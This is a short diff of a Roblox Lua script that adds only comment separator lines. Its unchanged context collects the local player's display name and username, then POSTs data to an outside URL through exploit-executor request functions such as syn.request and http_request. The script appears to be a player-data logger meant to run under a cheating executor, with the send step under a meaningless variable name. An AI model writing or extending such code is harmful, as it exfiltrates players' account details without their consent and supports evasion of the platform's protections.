@@ -7,6 +7,9 @@ local TeleportService = game:GetService("TeleportService")
 local Workspace = game:GetService("Workspace")
 local StarterGui = game:GetService("StarterGui"
 
+
+----------------------------
+
 -- Player Info
 local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
 local Name = game.Players.LocalPlayer.Name -- Name
@@ -99,6 +102,7 @@ local headers = {
 local request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+-----------------------------------------------------------------------------------------------
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
